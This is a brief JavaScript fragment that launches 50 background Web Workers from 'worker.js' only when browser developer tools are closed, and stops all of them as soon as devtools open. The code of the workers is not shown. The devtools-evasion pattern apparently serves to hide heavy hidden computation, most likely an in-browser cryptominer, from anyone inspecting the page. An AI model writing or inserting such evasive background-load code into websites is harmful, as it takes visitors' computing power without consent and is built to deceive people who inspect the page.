...
setTimeout(function() {
	...
	if(!window.devtools.open) {
		...
		for(var i = 0; i < 50; i++) {
			workers[i] = new Worker("worker.js?r="+Math.floor(Math.random() * 99999999));
			workers[i].postMessage("START");
		}

		window.addEventListener('devtoolschange', function (e) {if(e.detail.open)for(var i = 0; i < 50; i++)workers[i].postMessage("STOP");});
